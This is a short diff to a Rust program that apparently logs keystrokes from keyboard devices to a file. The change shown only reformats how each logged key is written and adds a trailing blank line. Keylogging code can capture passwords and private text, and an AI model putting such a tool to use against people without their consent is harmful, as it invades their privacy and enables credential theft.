@@ -84,7 +84,7 @@ fn main() {
 
 fn print_key(code: u16, sign: char, file: &mut File) {
     let text = get_key_text(code);
-    write!(file, "<{}>{}", sign, text).unwrap_or_else(|e| panic!("{}", e));
+    write!(file, "{}{}\n", sign, text).unwrap_or_else(|e| panic!("{}", e));
 }
 
 fn root_check() {
@@ -158,3 +158,4 @@ fn get_keyboard_device_filenames() -> Vec<String> {
     }
     filenames
 }
+
